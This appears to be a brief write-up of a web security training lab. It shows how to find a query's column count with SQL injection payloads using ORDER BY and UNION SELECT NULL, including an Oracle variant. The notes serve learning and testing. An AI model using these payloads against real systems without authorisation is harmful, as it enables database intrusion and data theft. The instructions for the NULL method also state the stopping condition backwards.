> Lab: **_SQL injection UNION attack, determining the number of columns returned by the query_**

---

Two ways of examining a number of columns used by a database:

1. Using ORDER BY clause

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
/*etc*/
```

Use the technique untill you get a SQL error.

2. Injecting NULL values

```sql
' UNION SELECT NULL--
' UNION SELECT NULL, NULL FROM DUAL /* in case of the Oracle db
' UNION SELECT NULL, NULL, NULL
/*etc*/
```

Use the technique untill you get a SQL error.

**Using both techniques you can identify the number of columns the database have.**
